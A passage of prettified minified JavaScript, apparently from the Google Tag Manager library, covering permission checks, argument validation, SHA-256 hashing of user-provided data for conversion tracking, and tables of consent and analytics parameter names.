          var n = {};
          z(k, function (p, q) {
            var r = (function Sf(a, b) {
              var c = wf(a, b);
              (c.vtp_permissionName = a), (c.vtp_createPermissionError = Rf);
              try {
                return Bf(c);
              } catch (d) {
                return {
                  assert: function (e) {
                    throw new Cf(e, {}, "Permission " + e + " is unknown.");
                  },
                  N: function () {
                    throw new Cf(a, {}, "Permission " + a + " is unknown.");
                  },
                };
              }
            })(p, q);
            (n[p] = r.assert),
              d[p] || (d[p] = r.N),
              r.Mj && !e[p] && (e[p] = r.Mj);
          }),
            (c.j[g] = function (p, q) {
              var r = n[p];
              if (!r)
                throw Rf(
                  p,
                  {},
                  "The requested permission " + p + " is not configured."
                );
              var t = Array.prototype.slice.call(arguments, 0);
              r.apply(void 0, t), f.apply(void 0, t);
              var u = e[p];
              u && u.apply(null, [m].concat(pa(t.slice(1))));
            });
        });
      },
      Uf = function (a) {
        return Mf.j[a] || function () {};
      };
    function Rf(a, b, c) {
      return new Cf(a, b, c);
    }
    var Vf = !1,
      Wf = {};
    (Wf.qk = yb("")), (Wf.El = yb(""));
    var bg = {},
      cg =
        ((bg.uaa = !0),
        (bg.uab = !0),
        (bg.uafvl = !0),
        (bg.uamb = !0),
        (bg.uam = !0),
        (bg.uap = !0),
        (bg.uapv = !0),
        (bg.uaw = !0),
        bg),
      kg = function (a, b) {
        for (var c = 0; c < b.length; c++) {
          var d = a,
            e = b[c];
          if (!ig.exec(e)) throw Error("Invalid key wildcard");
          var m,
            f = e.indexOf(".*"),
            g = -1 !== f && f === e.length - 2,
            k = g ? e.slice(0, e.length - 2) : e;
          a: if (0 === d.length) m = !1;
          else {
            for (var n = d.split("."), p = 0; p < n.length; p++)
              if (!jg.exec(n[p])) {
                m = !1;
                break a;
              }
            m = !0;
          }
          if (
            !(!m || k.length > d.length || (!g && d.length !== e.length)) &&
            (g ? Hb(d, k) && (d === k || "." === d.charAt(k.length)) : d === k)
          )
            return !0;
        }
        return !1;
      },
      jg = /^[a-z$_][\w$]*$/i,
      ig = /^(?:[a-z_$][a-z_$0-9]*\.)*[a-z_$][a-z_$0-9]*(?:\.\*)?$/i,
      lg = [
        "matches",
        "webkitMatchesSelector",
        "mozMatchesSelector",
        "msMatchesSelector",
        "oMatchesSelector",
      ];
    var ng = new vb();
    var wg = function (a, b) {
        return a.length && b.length && a.lastIndexOf(b) === a.length - b.length;
      },
      xg = function (a, b) {
        var c = "*" === b.charAt(b.length - 1) || "/" === b || "/*" === b;
        wg(b, "/*") && (b = b.slice(0, -2)), wg(b, "?") && (b = b.slice(0, -1));
        var d = b.split("*");
        if (!c && 1 === d.length) return a === d[0];
        for (var e = -1, f = 0; f < d.length; f++) {
          var g = d[f];
          if (g) {
            if (-1 === (e = a.indexOf(g, e)) || (0 === f && 0 !== e)) return !1;
            e += g.length;
          }
        }
        if (c || e === a.length) return !0;
        var k = d[d.length - 1];
        return a.lastIndexOf(k) === a.length - k.length;
      },
      zg = /^[a-z0-9-]+$/i,
      Ag = /^https:\/\/(\*\.|)((?:[a-z0-9-]+\.)+[a-z0-9-]+)\/(.*)$/i,
      Cg =
        /^([a-z][a-z0-9]*):(!|\?)(\*|string|boolean|number|Fn|PixieMap|List|OpaqueValue)$/i,
      Dg = { Fn: "function", PixieMap: "Object", List: "Array" };
    function K(a, b, c) {
      for (var d = 0; d < b.length; d++) {
        var e = Cg.exec(b[d]);
        if (!e) throw Error("Internal Error in " + a);
        var f = e[1],
          g = "!" === e[2],
          k = e[3],
          m = c[d];
        if (null == m) {
          if (g)
            throw Error(
              "Error in " + a + ". Required argument " + f + " not supplied."
            );
        } else if ("*" !== k) {
          var n = typeof m;
          if (
            (m instanceof Yc
              ? (n = "Fn")
              : m instanceof Wa
              ? (n = "List")
              : m instanceof Za
              ? (n = "PixieMap")
              : m instanceof cd && (n = "OpaqueValue"),
            n !== k)
          )
            throw Error(
              "Error in " +
                a +
                ". Argument " +
                f +
                " has type " +
                (Dg[n] || n) +
                ", which does not match required type " +
                (Dg[k] || k) +
                "."
            );
        }
      }
    }
    function Gg(a, b) {
      var c = new Yc(a, function () {
        for (
          var d = Array.prototype.slice.call(arguments, 0), e = 0;
          e < d.length;
          e++
        )
          d[e] = this.evaluate(d[e]);
        try {
          return b.apply(this, d);
        } catch (g) {
          throw g;
        }
      });
      return c.La(), c;
    }
    function Hg(a, b) {
      var d,
        c = new Za();
      for (d in b)
        if (b.hasOwnProperty(d)) {
          var e = b[d];
          pb(e)
            ? c.set(d, Gg(a + "_" + d, e))
            : Ta(e)
            ? c.set(d, Hg(a + "_" + d, e))
            : (qb(e) || l(e) || "boolean" == typeof e) && c.set(d, e);
        }
      return c.La(), c;
    }
    function Ig(a, b) {
      K(this.getName(), ["apiName:!string", "message:?string"], arguments);
      new Za();
      return Hg("AssertApiSubject", {});
    }
    function Jg(a, b) {
      if (
        (K(this.getName(), ["actual:?*", "message:?string"], arguments),
        a instanceof ed)
      )
        throw Error(
          "Argument actual cannot have type Promise. Assertions on asynchronous code aren't supported."
        );
      new Za();
      return Hg("AssertThatSubject", {});
    }
    function Kg(a) {
      return function () {
        for (var b = [], c = this.F, d = 0; d < arguments.length; ++d)
          b.push(J(arguments[d], c));
        return fd(a.apply(null, b));
      };
    }
    function Ng(a) {}
    function Og(a) {}
    function Pg(a) {
      try {
        return encodeURI(a);
      } catch (b) {}
    }
    function Qg(a) {
      try {
        return encodeURIComponent(a);
      } catch (b) {}
    }
    function Vg(a) {
      K(this.getName(), ["message:?string"], arguments);
    }
    function Wg(a, b) {
      return (
        K(this.getName(), ["min:!number", "max:!number"], arguments), tb(a, b)
      );
    }
    function Xg() {
      return new Date().getTime();
    }
    function Yg(a) {
      if (null === a) return "null";
      if (a instanceof Wa) return "array";
      if (a instanceof Yc) return "function";
      if (a instanceof cd) {
        var b, c;
        if (
          void 0 ===
            (null == (c = a = null == (b = a) ? void 0 : b.getValue())
              ? void 0
              : c.constructor) ||
          void 0 === a.constructor.name
        ) {
          var d = String(a);
          return d.substring(8, d.length - 1);
        }
        return String(a.constructor.name);
      }
      return typeof a;
    }
    function $g(a) {
      return (function xb(a) {
        return Math.round(Number(a)) || 0;
      })(J(a, this.F));
    }
    function ah(a) {
      return Number(J(a, this.F));
    }
    function bh(a) {
      return null === a ? "null" : void 0 === a ? "undefined" : a.toString();
    }
    function ch(a, b, c) {
      var d = null,
        e = !1;
      K(
        this.getName(),
        ["tableObj:!List", "keyColumnName:!string", "valueColumnName:!string"],
        arguments
      ),
        (d = new Za());
      for (var f = 0; f < a.length(); f++) {
        var g = a.get(f);
        g instanceof Za &&
          g.has(b) &&
          g.has(c) &&
          (d.set(g.get(b), g.get(c)), (e = !0));
      }
      return e ? d : null;
    }
    var Mg = "floor ceil round max min abs pow sqrt".split(" ");
    function fh(a, b) {
      K(this.getName(), ["apiName:!string", "mock:?*"], arguments);
    }
    function gh(a, b) {
      K(this.getName(), ["apiName:!string", "mock:!PixieMap"], arguments);
    }
    var hh = {};
    function N(a, b) {
      var c = za.apply(2, arguments),
        d = a.F.j;
      if (!d) throw Error("Missing program state.");
      if (d.Pm)
        try {
          d.Nj.apply(null, [b].concat(pa(c)));
        } catch (e) {
          throw (ib("TAGGING", 21), e);
        }
      else d.Nj.apply(null, [b].concat(pa(c)));
    }
    (hh.keys = function (a) {
      return new Wa();
    }),
      (hh.values = function (a) {
        return new Wa();
      }),
      (hh.entries = function (a) {
        return new Wa();
      }),
      (hh.freeze = function (a) {
        return a;
      }),
      (hh.delete = function (a, b) {
        return !1;
      });
    var jh = function () {
      (this.j = {}), (this.D = {}), (this.H = !0);
    };
    function mh(a) {
      return nh ? H.querySelectorAll(a) : null;
    }
    function oh(a, b) {
      if (!nh) return null;
      if (Element.prototype.closest)
        try {
          return a.closest(b);
        } catch (e) {
          return null;
        }
      var c =
          Element.prototype.matches ||
          Element.prototype.webkitMatchesSelector ||
          Element.prototype.mozMatchesSelector ||
          Element.prototype.msMatchesSelector ||
          Element.prototype.oMatchesSelector,
        d = a;
      if (!H.documentElement.contains(d)) return null;
      do {
        try {
          if (c.call(d, b)) return d;
        } catch (e) {
          break;
        }
        d = d.parentElement || d.parentNode;
      } while (null !== d && 1 === d.nodeType);
      return null;
    }
    (jh.prototype.get = function (a, b) {
      return this.j.hasOwnProperty(a) ? this.j[a] : void 0;
    }),
      (jh.prototype.add = function (a, b, c) {
        if (this.j.hasOwnProperty(a))
          throw Error(
            "Attempting to add a function which already exists: " + a + "."
          );
        if (this.D.hasOwnProperty(a))
          throw Error(
            "Attempting to add an API with an existing private API name: " +
              a +
              "."
          );
        this.j[a] = c ? void 0 : pb(b) ? Gg(a, b) : Hg(a, b);
      });
    var ph = !1;
    if (H.querySelectorAll)
      try {
        var qh = H.querySelectorAll(":root");
        qh && 1 == qh.length && qh[0] == H.documentElement && (ph = !0);
      } catch (a) {}
    var nh = ph,
      rh = /^[0-9A-Fa-f]{64}$/;
    function th(a) {
      if ("" === a || "e0" === a) return Promise.resolve(a);
      var b;
      if (null == (b = G.crypto) || !b.subtle) return Promise.resolve("e1");
      if (rh.test(a)) return Promise.resolve(a);
      try {
        var c = (function sh(a) {
          try {
            return new TextEncoder().encode(a);
          } catch (e) {
            for (var b = [], c = 0; c < a.length; c++) {
              var d = a.charCodeAt(c);
              d < 128
                ? b.push(d)
                : d < 2048
                ? b.push(192 | (d >> 6), 128 | (63 & d))
                : d < 55296 || d >= 57344
                ? b.push(224 | (d >> 12), 128 | ((d >> 6) & 63), 128 | (63 & d))
                : ((d =
                    65536 + (((1023 & d) << 10) | (1023 & a.charCodeAt(++c)))),
                  b.push(
                    240 | (d >> 18),
                    128 | ((d >> 12) & 63),
                    128 | ((d >> 6) & 63),
                    128 | (63 & d)
                  ));
            }
            return new Uint8Array(b);
          }
        })(a);
        return G.crypto.subtle
          .digest("SHA-256", c)
          .then(function (d) {
            var e = Array.from(new Uint8Array(d))
              .map(function (f) {
                return String.fromCharCode(f);
              })
              .join("");
            return G.btoa(e)
              .replace(/\+/g, "-")
              .replace(/\//g, "_")
              .replace(/=+$/, "");
          })
          .catch(function () {
            return "e2";
          });
      } catch (d) {
        return Promise.resolve("e2");
      }
    }
    function O(a) {
      ib("GTM", a);
    }
    var Ah = function (a) {
        for (var b = ["tv.1"], c = 0, d = 0; d < a.length; ++d) {
          var e = a[d].name,
            f = a[d].value,
            g = a[d].index,
            k = uh[e];
          k &&
            f &&
            (-1 === vh.indexOf(e) ||
              /^e\d+$/.test(f) ||
              wh.test(f) ||
              rh.test(f)) &&
            (void 0 !== g && (k += g), b.push(k + "." + f), c++);
        }
        return (
          1 === a.length && "error_code" === a[0].name && (c = 0),
          { Zj: encodeURIComponent(b.join("~")), Ue: c }
        );
      },
      yh = function (a, b) {
        Bh(a, function (c) {
          var d = Ah(c);
          b(d.Zj, d.Ue);
        });
      },
      Jh = function (a) {
        function b(r, t, u, v) {
          var w = Ch(r);
          "" !== w &&
            (rh.test(w)
              ? k.push({ name: t, value: w, index: v })
              : k.push({ name: t, value: u(w), index: v }));
        }
        function c(r, t) {
          var u = r;
          if (l(u) || Array.isArray(u)) {
            u = rb(r);
            for (var v = 0; v < u.length; ++v) {
              var w = Ch(u[v]),
                x = rh.test(w);
              t && !x && O(89), !t && x && O(88);
            }
          }
        }
        function d(r, t) {
          var u = r[t];
          c(u, !1);
          var v = Dh[t];
          return r[v] && (r[t] && O(90), c((u = r[v]), !0)), u;
        }
        function e(r, t, u) {
          for (var v = rb(d(r, t)), w = 0; w < v.length; ++w) b(v[w], t, u);
        }
        function f(r, t, u, v) {
          b(d(r, t), t, u, v);
        }
        function g(r) {
          return function (t) {
            return O(64), r(t);
          };
        }
        var k = [];
        if ("https:" !== G.location.protocol)
          return k.push({ name: "error_code", value: "e3", index: void 0 }), k;
        e(a, "email", Eh),
          e(a, "phone_number", Fh),
          e(a, "first_name", g(Gh)),
          e(a, "last_name", g(Gh));
        var m = a.home_address || {};
        e(m, "street", g(Hh)),
          e(m, "city", g(Hh)),
          e(m, "postal_code", g(Ih)),
          e(m, "region", g(Hh)),
          e(m, "country", g(Ih));
        for (var n = rb(a.address || {}), p = 0; p < n.length; p++) {
          var q = n[p];
          f(q, "first_name", Gh, p),
            f(q, "last_name", Gh, p),
            f(q, "street", Hh, p),
            f(q, "city", Hh, p),
            f(q, "postal_code", Ih, p),
            f(q, "region", Hh, p),
            f(q, "country", Ih, p);
        }
        return k;
      },
      Bh = function (a, b) {
        var c = Jh(a);
        Kh(c, b);
      },
      Ch = function (a) {
        return null == a ? "" : l(a) ? Ab(String(a)) : "e0";
      },
      Ih = function (a) {
        return a.replace(Lh, "");
      },
      Gh = function (a) {
        return Hh(a.replace(/\s/g, ""));
      },
      Hh = function (a) {
        return Ab(a.replace(Mh, "").toLowerCase());
      },
      Fh = function (a) {
        return (
          "+" !== (a = a.replace(/[\s-()/.]/g, "")).charAt(0) && (a = "+" + a),
          Nh.test(a) ? a : "e0"
        );
      },
      Eh = function (a) {
        var b = a.toLowerCase().split("@");
        if (2 === b.length) {
          var c = b[0];
          if (
            (/^(gmail|googlemail)\./.test(b[1]) && (c = c.replace(/\./g, "")),
            (c = c + "@" + b[1]),
            Oh.test(c))
          )
            return c;
        }
        return "e0";
      },
      Kh = function (a, b) {
        a.some(function (c) {
          c.value && vh.indexOf(c.name);
        })
          ? b(a)
          : G.Promise
          ? Promise.all(
              a.map(function (c) {
                return c.value && -1 !== vh.indexOf(c.name)
                  ? th(c.value).then(function (d) {
                      c.value = d;
                    })
                  : Promise.resolve();
              })
            )
              .then(function () {
                b(a);
              })
              .catch(function () {
                b([]);
              })
          : b([]);
      },
      Mh = /[0-9`~!@#$%^&*()_\-+=:;<>,.?|/\\[\]]/g,
      Oh = /^\S+@\S+\.\S+$/,
      Nh = /^\+\d{10,15}$/,
      Lh = /[.~]/g,
      wh = /^[0-9A-Za-z_-]{43}$/,
      Ph = {},
      uh =
        ((Ph.email = "em"),
        (Ph.phone_number = "pn"),
        (Ph.first_name = "fn"),
        (Ph.last_name = "ln"),
        (Ph.street = "sa"),
        (Ph.city = "ct"),
        (Ph.region = "rg"),
        (Ph.country = "co"),
        (Ph.postal_code = "pc"),
        (Ph.error_code = "ec"),
        Ph),
      Qh = {},
      Dh =
        ((Qh.email = "sha256_email_address"),
        (Qh.phone_number = "sha256_phone_number"),
        (Qh.first_name = "sha256_first_name"),
        (Qh.last_name = "sha256_last_name"),
        (Qh.street = "sha256_street"),
        Qh),
      vh = Object.freeze([
        "email",
        "phone_number",
        "first_name",
        "last_name",
        "street",
      ]),
      P = {
        g: {
          ya: "ad_personalization",
          R: "ad_storage",
          O: "ad_user_data",
          U: "analytics_storage",
          Eb: "region",
          Sb: "consent_updated",
          af: "wait_for_update",
          oi: "app_remove",
          ri: "app_store_refund",
          si: "app_store_subscription_cancel",
          ui: "app_store_subscription_convert",
          vi: "app_store_subscription_renew",
          Bk: "consent_update",
          eg: "add_payment_info",
          fg: "add_shipping_info",
          oc: "add_to_cart",
          qc: "remove_from_cart",
          gg: "view_cart",
          Tb: "begin_checkout",
          rc: "select_item",
          kb: "view_item_list",
          Fb: "select_promotion",
          lb: "view_promotion",
          Ia: "purchase",
          sc: "refund",
          Na: "view_item",
          hg: "add_to_wishlist",
          Ck: "exception",
          wi: "first_open",
          xi: "first_visit",
          ba: "gtag.config",
          Ua: "gtag.get",
          yi: "in_app_purchase",
          Ub: "page_view",
          Dk: "screen_view",
          zi: "session_start",
          Ek: "timing_complete",
          Fk: "track_social",
          Nc: "user_engagement",
          Gk: "user_id_update",
          nb: "gclgb",
          Va: "gclid",
          Ai: "gclgs",
          Bi: "gclst",
          fa: "ads_data_redaction",
          Ci: "gad_source",
          Di: "gad_source_src",
          Hd: "gclid_url",
          Ei: "gclsrc",
          ig: "gbraid",
          bf: "wbraid",
          ka: "allow_ad_personalization_signals",
          cf: "allow_custom_scripts",
          Id: "allow_direct_google_requests",
          df: "allow_display_features",
          Jd: "allow_enhanced_conversions",
          ob: "allow_google_signals",
          Ca: "allow_interest_groups",
          Hk: "app_id",
          Ik: "app_installer_id",
          Jk: "app_name",
          Kk: "app_version",
          Gb: "auid",
          Fi: "auto_detection_enabled",
          Vb: "aw_remarketing",
          ef: "aw_remarketing_only",
          Kd: "discount",
          Ld: "aw_feed_country",
          Md: "aw_feed_language",
          da: "items",
          Nd: "aw_merchant_id",
          jg: "aw_basket_type",
          Oc: "campaign_content",
          Pc: "campaign_id",
          Qc: "campaign_medium",
          Rc: "campaign_name",
          Sc: "campaign",
          Tc: "campaign_source",
          Uc: "campaign_term",
          pb: "client_id",
          Gi: "rnd",
          kg: "consent_update_type",
          Hi: "content_group",
          Ii: "content_type",
          Za: "conversion_cookie_prefix",
          Vc: "conversion_id",
          ra: "conversion_linker",
          Ji: "conversion_linker_disabled",
          Wb: "conversion_api",
          ff: "cookie_deprecation",
          Wa: "cookie_domain",
          Oa: "cookie_expires",
          ab: "cookie_flags",
          uc: "cookie_name",
          Hb: "cookie_path",
          Pa: "cookie_prefix",
          vc: "cookie_update",
          wc: "country",
          za: "currency",
          Od: "customer_lifetime_value",
          Wc: "custom_map",
          lg: "gcldc",
          Pd: "dclid",
          Ki: "debug_mode",
          la: "developer_id",
          Li: "disable_merchant_reported_purchases",
          Xc: "dc_custom_params",
          Mi: "dc_natural_search",
          mg: "dynamic_event_settings",
          ng: "affiliation",
          Qd: "checkout_option",
          hf: "checkout_step",
          og: "coupon",
          Yc: "item_list_name",
          jf: "list_name",
          Ni: "promotions",
          Zc: "shipping",
          kf: "tax",
          Rd: "engagement_time_msec",
          Sd: "enhanced_client_id",
          Td: "enhanced_conversions",
          pg: "enhanced_conversions_automatic_settings",
          Ud: "estimated_delivery_date",
          lf: "euid_logged_in_state",
          bd: "event_callback",
          Lk: "event_category",
          rb: "event_developer_id_string",
          Mk: "event_label",
          xc: "event",
          Vd: "event_settings",
          Wd: "event_timeout",
          Nk: "description",
          Ok: "fatal",
          Oi: "experiments",
          nf: "firebase_id",
          yc: "first_party_collection",
          Xd: "_x_20",
          sb: "_x_19",
          Pi: "fledge_drop_reason",
          qg: "fledge",
          rg: "flight_error_code",
          sg: "flight_error_message",
          Qi: "fl_activity_category",
          Ri: "fl_activity_group",
          ug: "fl_advertiser_id",
          Si: "fl_ar_dedupe",
          vg: "match_id",
          Ti: "fl_random_number",
          Ui: "tran",
          Vi: "u",
          Yd: "gac_gclid",
          zc: "gac_wbraid",
          wg: "gac_wbraid_multiple_conversions",
          xg: "ga_restrict_domain",
          yg: "ga_temp_client_id",
          Ac: "gdpr_applies",
          zg: "geo_granularity",
          Ib: "value_callback",
          tb: "value_key",
          Bc: "_google_ng",
          Xb: "google_signals",
          Ag: "google_tld",
          Zd: "groups",
          Bg: "gsa_experiment_id",
          Wi: "gtm_up",
          Jb: "iframe_state",
          dd: "ignore_referrer",
          pf: "internal_traffic_results",
          Yb: "is_legacy_converted",
          Kb: "is_legacy_loaded",
          ae: "is_passthrough",
          ed: "_lps",
          Qa: "language",
          be: "legacy_developer_id_string",
          sa: "linker",
          Cc: "accept_incoming",
          vb: "decorate_forms",
          W: "domains",
          Lb: "url_position",
          Cg: "method",
          Pk: "name",
          fd: "new_customer",
          Dg: "non_interaction",
          Xi: "optimize_id",
          Yi: "page_hostname",
          gd: "page_path",
          Da: "page_referrer",
          cb: "page_title",
          Eg: "passengers",
          Fg: "phone_conversion_callback",
          Zi: "phone_conversion_country_code",
          Gg: "phone_conversion_css_class",
          aj: "phone_conversion_ids",
          Hg: "phone_conversion_number",
          Ig: "phone_conversion_options",
          Jg: "_protected_audience_enabled",
          hd: "quantity",
          de: "redact_device_info",
          qf: "referral_exclusion_definition",
          Zb: "restricted_data_processing",
          bj: "retoken",
          Qk: "sample_rate",
          rf: "screen_name",
          Mb: "screen_resolution",
          cj: "search_term",
          Ja: "send_page_view",
          ac: "send_to",
          jd: "server_container_url",
          kd: "session_duration",
          ee: "session_engaged",
          tf: "session_engaged_time",
          wb: "session_id",
          fe: "session_number",
          uf: "_shared_user_id",
          ld: "delivery_postal_code",
          Rk: "temporary_client_id",
          vf: "topmost_url",
          dj: "tracking_id",
          wf: "traffic_type",
          Aa: "transaction_id",
          Nb: "transport_url",
          Kg: "trip_type",
          bc: "update",
          Xa: "url_passthrough",
          xf: "_user_agent_architecture",
          yf: "_user_agent_bitness",
          zf: "_user_agent_full_version_list",
          Af: "_user_agent_mobile",
          Bf: "_user_agent_model",
          Cf: "_user_agent_platform",
          Df: "_user_agent_platform_version",
          Ef: "_user_agent_wow64",
          Ea: "user_data",
          Lg: "user_data_auto_latency",
          Mg: "user_data_auto_meta",
          Ng: "user_data_auto_multi",
          Og: "user_data_auto_selectors",
          Pg: "user_data_auto_status",
          md: "user_data_mode",
          he: "user_data_settings",
          Ba: "user_id",
          eb: "user_properties",
          ej: "_user_region",
          ie: "us_privacy_string",
          na: "value",
          Qg: "wbraid_multiple_conversions",
          me: "_fpm_parameters",
          nj: "_host_name",
          oj: "_in_page_command",
          pj: "_is_passthrough_cid",
          Ob: "non_personalized_ads",
          te: "_sst_parameters",
          qb: "conversion_label",
          wa: "page_location",
          ub: "global_developer_id_string",
          Dc: "tc_privacy_string",
        },
      },
      Rh = {};
    Object.freeze(
      ((Rh[P.g.ka] = 1),
      (Rh[P.g.df] = 1),
      (Rh[P.g.Jd] = 1),
      (Rh[P.g.ob] = 1),
      (Rh[P.g.da] = 1),
      (Rh[P.g.Wa] = 1),
      (Rh[P.g.Oa] = 1),
      (Rh[P.g.ab] = 1),
      (Rh[P.g.uc] = 1),
      (Rh[P.g.Hb] = 1),
      (Rh[P.g.Pa] = 1),
      (Rh[P.g.vc] = 1),
      (Rh[P.g.Wc] = 1),
      (Rh[P.g.la] = 1),
      (Rh[P.g.mg] = 1),
      (Rh[P.g.bd] = 1),
      (Rh[P.g.Vd] = 1),
      (Rh[P.g.Wd] = 1),
      (Rh[P.g.yc] = 1),
      (Rh[P.g.xg] = 1),
      (Rh[P.g.Xb] = 1),
      (Rh[P.g.Ag] = 1),
      (Rh[P.g.Zd] = 1),
      (Rh[P.g.pf] = 1),
      (Rh[P.g.Yb] = 1),
      (Rh[P.g.Kb] = 1),
      (Rh[P.g.sa] = 1),
      (Rh[P.g.qf] = 1),
      (Rh[P.g.Zb] = 1),
      (Rh[P.g.Ja] = 1),
      (Rh[P.g.ac] = 1),
      (Rh[P.g.jd] = 1),
      (Rh[P.g.kd] = 1),
      (Rh[P.g.tf] = 1),
      (Rh[P.g.ld] = 1),
      (Rh[P.g.Nb] = 1),
      (Rh[P.g.bc] = 1),
      (Rh[P.g.he] = 1),
      (Rh[P.g.eb] = 1),
      (Rh[P.g.te] = 1),
      Rh)
    );
    Object.freeze([
      P.g.wa,
      P.g.Da,
      P.g.cb,
      P.g.Qa,
      P.g.rf,
      P.g.Ba,
      P.g.nf,
      P.g.Hi,
    ]);
    var Th = {},
      Vh =
        (Object.freeze(
          ((Th[P.g.oi] = 1),
          (Th[P.g.ri] = 1),
          (Th[P.g.si] = 1),
          (Th[P.g.ui] = 1),
          (Th[P.g.vi] = 1),
          (Th[P.g.wi] = 1),
          (Th[P.g.xi] = 1),
          (Th[P.g.yi] = 1),
          (Th[P.g.zi] = 1),
          (Th[P.g.Nc] = 1),
          Th)
        ),
        {}),
      Wh = Object.freeze(
        ((Vh[P.g.eg] = 1),
        (Vh[P.g.fg] = 1),
        (Vh[P.g.oc] = 1),
        (Vh[P.g.qc] = 1),
        (Vh[P.g.gg] = 1),
        (Vh[P.g.Tb] = 1),
        (Vh[P.g.rc] = 1),
        (Vh[P.g.kb] = 1),
        (Vh[P.g.Fb] = 1),
        (Vh[P.g.lb] = 1),
        (Vh[P.g.Ia] = 1),
        (Vh[P.g.sc] = 1),
        (Vh[P.g.Na] = 1),
        (Vh[P.g.hg] = 1),
        Vh)
      ),
      Xh = Object.freeze([
        P.g.ka,
        P.g.Id,
        P.g.ob,
        P.g.vc,
        P.g.yc,
        P.g.dd,
        P.g.Ja,
        P.g.bc,
      ]),
      Zh =
        (Object.freeze([].concat(pa(Xh))),
        Object.freeze([P.g.Oa, P.g.Wd, P.g.kd, P.g.tf, P.g.Rd])),
      ai = (Object.freeze([].concat(pa(Zh))), {}),
      ci =
        ((ai[P.g.R] = "1"),
        (ai[P.g.U] = "2"),
        (ai[P.g.O] = "3"),
        (ai[P.g.ya] = "4"),
        {}),
      di = Object.freeze(
        ((ci[P.g.ka] = 1),
        (ci[P.g.Id] = 1),
        (ci[P.g.Jd] = 1),
        (ci[P.g.Ca] = 1),
        (ci[P.g.Vb] = 1),
        (ci[P.g.ef] = 1),
        (ci[P.g.Kd] = 1),
        (ci[P.g.Ld] = 1),
        (ci[P.g.Md] = 1),
        (ci[P.g.da] = 1),
        (ci[P.g.Nd] = 1),
        (ci[P.g.Za] = 1),
        (ci[P.g.ra] = 1),
        (ci[P.g.Wa] = 1),
        (ci[P.g.Oa] = 1),
        (ci[P.g.ab] = 1),
        (ci[P.g.Pa] = 1),
        (ci[P.g.za] = 1),
        (ci[P.g.Od] = 1),
        (ci[P.g.la] = 1),
        (ci[P.g.Li] = 1),
        (ci[P.g.Td] = 1),
        (ci[P.g.Ud] = 1),
        (ci[P.g.nf] = 1),
        (ci[P.g.yc] = 1),
        (ci[P.g.Yb] = 1),
        (ci[P.g.Kb] = 1),
        (ci[P.g.Qa] = 1),
        (ci[P.g.fd] = 1),
        (ci[P.g.wa] = 1),
        (ci[P.g.Da] = 1),
        (ci[P.g.Fg] = 1),
        (ci[P.g.Gg] = 1),
        (ci[P.g.Hg] = 1),
        (ci[P.g.Ig] = 1),
        (ci[P.g.Zb] = 1),
        (ci[P.g.Ja] = 1),
        (ci[P.g.ac] = 1),
        (ci[P.g.jd] = 1),
        (ci[P.g.ld] = 1),
        (ci[P.g.Aa] = 1),
        (ci[P.g.Nb] = 1),
        (ci[P.g.bc] = 1),
        (ci[P.g.Xa] = 1),
        (ci[P.g.Ea] = 1),
        (ci[P.g.Ba] = 1),
        (ci[P.g.na] = 1),
        ci)
      ),
      ei = {},
      fi = Object.freeze(
        ((ei.search = "s"),
        (ei.youtube = "y"),
        (ei.playstore = "p"),
        (ei.shopping = "h"),
        (ei.ads = "a"),
        (ei.maps = "m"),
        ei)
      );
    Object.freeze(P.g);
    var gi = {},
      hi = (G.google_tag_manager = G.google_tag_manager || {});
    (gi.Vg = "4880"),
      (gi.se = Number("0") || 0),
      (gi.Ya = "dataLayer"),
      (gi.rn =
        "ChAI8OXmtQYQvoz264Wm4NZCEiQA0wocuYZUTRDHWVrPRTCNPTJ/6GA7HR9EfDLUJkjL0yC30coaAsRa");
    var ki,
      ii = {
        __cl: 1,
        __ecl: 1,
        __ehl: 1,
        __evl: 1,
        __fal: 1,
        __fil: 1,
        __fsl: 1,
        __hl: 1,
        __jel: 1,
        __lcl: 1,
        __sdl: 1,
        __tl: 1,
        __ytl: 1,
      },
      ji = { __paused: 1, __tg: 1 };
    for (ki in ii) ii.hasOwnProperty(ki) && (ji[ki] = 1);
    var mi,
      li = yb("");
    mi = !1;
    var oi;
    oi = !1;
    var qi;
    (qi = !1), (gi.Gd = "www.googletagmanager.com");
    var si = gi.Gd + (mi ? "/gtag/js" : "/gtm.js"),
      ti = null,
      ui = null,
      vi = {},
      wi = {};
    function xi() {
      var a = hi.sequence || 1;
      return (hi.sequence = a + 1), a;
    }
    gi.zk = "";
    gi.Jf = "";
    var zi = new (function () {
      (this.j = ""),
        (this.H = this.D = !1),
        (this.P = 0),
        (this.fb = this.Z = this.Ra = this.K = "");
    })();
    function Ai() {
      var a = zi.K.length;
      return "/" === zi.K[a - 1] ? zi.K.substring(0, a - 1) : zi.K;
    }
    function Bi(a) {
      for (
        var b = {}, c = ma(a.split("|")), d = c.next();
        !d.done;
        d = c.next()
      )
        b[d.value] = !0;
      return b;
    }
    var Ci = new vb(),
      Di = {},
      Ei = {},
      Hi = {
        name: gi.Ya,
        set: function (a, b) {
          h(Kb(a, b), Di), Fi();
        },
        get: function (a) {
          return Gi(a, 2);
        },
        reset: function () {
          (Ci = new vb()), (Di = {}), Fi();
        },
      };
    function Gi(a, b) {
      return 2 != b ? Ci.get(a) : Ii(a);
    }
    function Ii(a, b) {
      var c = a.split(".");
      b = b || [];
      for (var d = Di, e = 0; e < c.length; e++) {
        if (null === d) return !1;
        if (void 0 === d) break;
        if (((d = d[c[e]]), -1 !== b.indexOf(d))) return;
      }
      return d;
    }
    function Ji(a, b) {
      Ei.hasOwnProperty(a) || (Ci.set(a, b), h(Kb(a, b), Di), Fi());
    }
    function Ki() {
      for (
        var a = [
            "gtm.allowlist",
            "gtm.blocklist",
            "gtm.whitelist",
            "gtm.blacklist",
            "tagTypeBlacklist",
          ],
          b = 0;
        b < a.length;
        b++
      ) {
        var c = a[b],
          d = Gi(c, 1);
        (Array.isArray(d) || Ta(d)) && (d = h(d)), (Ei[c] = d);
      }
    }
    function Fi(a) {
      z(Ei, function (b, c) {
        Ci.set(b, c), h(Kb(b), Di), h(Kb(b, c), Di), a && delete Ei[b];
      });
    }
    function Li(a, b) {
      var d = 1 !== (void 0 === b ? 2 : b) ? Ii(a) : Ci.get(a);
      return "array" === Qa(d) || "object" === Qa(d) ? h(d) : d;
    }
    var Mi = function (a, b, c) {
        if (!c) return !1;
        var f,
          d = c.selector_type,
          e = String(c.value);
        if ("js_variable" === d)
          for (
            var g = (e = e
                .replace(/\["?'?/g, ".")
                .replace(/"?'?\]/g, "")).split(","),
              k = 0;
            k < g.length;
            k++
          ) {
            var m = g[k].trim();
            if (m) {
              if (Hb(m, "dataLayer.")) f = Gi(m.substring(10));
              else {
                var n = m.split(".");
                f = G[n.shift()];
